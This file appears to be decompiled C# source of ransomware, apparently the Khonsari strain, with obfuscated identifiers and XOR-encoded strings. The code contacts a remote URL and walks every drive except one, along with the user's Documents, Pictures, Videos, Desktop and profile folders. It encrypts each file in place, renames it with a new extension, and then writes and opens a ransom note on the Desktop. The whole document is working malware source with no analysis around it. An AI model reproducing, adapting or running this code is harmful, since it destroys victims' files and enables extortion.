using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;

internal static class SCVuZRaW
{
	private static readonly ivClqxOl FrfatcMQ = new ivClqxOl();

	private static readonly string HtqeFwaI;

	private static readonly string rbTApefo;

	private const string jkuckbUP = ".khonsari";

	private static void Main()
	{
		List<string> list = new List<string>();
		WebClient webClient = new WebClient();
		string text = "/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007f\u0006;3";
		string eDhcLlqR = text;
		string text2 = "GoaahQrC";
		string text3 = text2;
		string vnNtUrJn = text3;
		webClient.DownloadString(_003CModule_003E.CajLqoCk(eDhcLlqR, vnNtUrJn));
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string name = driveInfo.Name;
			string text4 = "2w\u0015";
			string eDhcLlqR2 = text4;
			string text5 = "qMIamfMA";
			string text6 = text5;
			string vnNtUrJn2 = text6;
			if (!name.Equals(_003CModule_003E.CajLqoCk(eDhcLlqR2, vnNtUrJn2)))
			{
				list.Add(driveInfo.Name);
			}
		}
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		string eDhcLlqR3 = ")=&\u0004%%&#\u001e";
		string text7 = "mRQjIJGG";
		string vnNtUrJn3 = text7;
		list.Add(Path.Combine(folderPath, _003CModule_003E.CajLqoCk(eDhcLlqR3, vnNtUrJn3)));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		foreach (string item in list)
		{
			try
			{
				foreach (string item2 in bXUaefgt(item))
				{
					if (!LxqQXinF(item2))
					{
						try
						{
							File.WriteAllBytes(item2, FrfatcMQ.rVWZTCXX(File.ReadAllBytes(item2)));
							string eDhcLlqR4 = "T)\u0004\f/4+3\u0013";
							string text8 = "zBlcAGJA";
							string vnNtUrJn4 = text8;
							File.Move(item2, item2 + _003CModule_003E.CajLqoCk(eDhcLlqR4, vnNtUrJn4));
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
		File.WriteAllText(HtqeFwaI, rbTApefo);
		Process.Start(HtqeFwaI);
	}

	private static IEnumerable<string> bXUaefgt(string TRMxsUCM)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(TRMxsUCM);
		while (queue.Count > 0)
		{
			TRMxsUCM = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(TRMxsUCM);
				foreach (string item in directories)
				{
					queue.Enqueue(item);
				}
			}
			catch
			{
			}
			string[] array = null;
			try
			{
				array = Directory.GetFiles(TRMxsUCM);
			}
			catch
			{
			}
			if (array != null)
			{
				for (int j = 0; j < array.Length; j++)
				{
					yield return array[j];
				}
			}
		}
	}

	private static bool LxqQXinF(string YzmfzBzk)
	{
		string text = "\u007f\u001d\0\a\u000f\"\u000e%8";
		string eDhcLlqR = text;
		string vnNtUrJn = "QvhhaQoW";
		if (!YzmfzBzk.EndsWith(_003CModule_003E.CajLqoCk(eDhcLlqR, vnNtUrJn)))
		{
			string eDhcLlqR2 = "g\u001d/.";
			string text2 = "ItAGEocK";
			string vnNtUrJn2 = text2;
			if (!YzmfzBzk.EndsWith(_003CModule_003E.CajLqoCk(eDhcLlqR2, vnNtUrJn2)))
			{
				string eDhcLlqR3 = "\r\a2";
				string text3 = "diYplLvh";
				string text4 = text3;
				string vnNtUrJn3 = text4;
				if (!YzmfzBzk.EndsWith(_003CModule_003E.CajLqoCk(eDhcLlqR3, vnNtUrJn3)))
				{
					return YzmfzBzk.Equals(HtqeFwaI);
				}
			}
		}
		return true;
	}

	static SCVuZRaW()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string eDhcLlqR = "\u0015\u0010=\u001ce\u0015\0e\u000e\u001d&k\u001c\u000e\u001a\u0017i\u001e;\a\0\u0012o\a\b\u001b9e\u0011\u0019\u001b";
		HtqeFwaI = folderPath + _003CModule_003E.CajLqoCk(eDhcLlqR, "IXrKEAOE");
		string text = "\u0016\r\0\u0019v\b(\t*\u0011U\u00037\u0018$E-\a\u0010\u0005v\v/\u0006=\u001b\u0005\u001f3\na\u0004!\u0006U\u0018\"\u0001-\0!B\u0017\u0012v\u001a)\0o)\u001d\u00048\u001d \u0017&B\u0013\n;\a-\u001cah<\rv\u0017.\u0010o\u0015\u001c\u0018>N5\no\u0006\u0010\b$\u00171\u0011oNU\b7\u0002-EgPG^\u007fNs]xODXfWa\n=B\u0010\u00067\a-E$\u0003\a\u000e8\u0005)\n!\u0011\u0014\u0019?.&\b.\v\u0019E5\u0001,KE+\u0013K/\u00014E+\rU\u00059\u001aa\u000e!\r\u0002K>\u00016E;\rU\t#\u0017a\a;\u0001YK#\u001d$E.B\u0006\u000e7\u001c\"\ro\a\u001b\f?\0$E;\rU\r?\0%E*\u001a\u0016\u00037\0&\0<L\u007f/\u0019N\u000f*\u001bB8$\u0012'\a<o-'K\u0012+\r \u001b'U?\u001e'\u0012E\t+9.v!\u0013E\u000e,,K\u0013 \u00027\u00162!.\u0012N\a,\u0003'&Ev'\aE\u0016- K\u0012!mE\u0016- 9v(\b)\n1U&\u00177a'\nB %\u0004+\u0002*\u0019''*\u0014\"\u0004KE;\u001a\u001e$N\b!o\v\u0006Q";
		string eDhcLlqR2 = text;
		string vnNtUrJn = "ObukVnAe";
		rbTApefo = _003CModule_003E.CajLqoCk(eDhcLlqR2, vnNtUrJn) + FrfatcMQ.PruZnHLM;
	}
}
